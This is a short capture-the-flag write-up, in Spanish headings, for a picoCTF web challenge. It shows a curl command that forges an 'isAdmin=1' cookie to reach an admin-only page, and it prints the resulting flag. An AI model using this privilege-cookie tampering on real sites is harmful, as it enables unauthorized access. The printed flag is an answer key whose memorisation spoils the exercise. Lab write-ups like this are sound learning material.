## Objetivo 
Can you get the flag?Go to this [website](http://saturn.picoctf.net:57741/) and see what you can discover.

## Solución
```bash
┌──(luispuentes㉿LuisPuentes)-[~/picoCTF/Parcial2]
└─$ curl http://saturn.picoctf.net:57741/check.php -H "Cookie: isAdmin=1"




<html>
<body>



<p>picoCTF{gr4d3_A_c00k13_5d2505be}</p>


</body>
</html>
                                                                                                                            
┌──(luispuentes㉿LuisPuentes)-[~/picoCTF/Parcial2]
└─$ 

picoCTF{gr4d3_A_c00k13_5d2505be}
```
## Notas
Hay una cookie llamada isAdmin con valor de 0 si se modifica por 1 y recargamos la pagina nos muestra la contraseña.

## Referencias
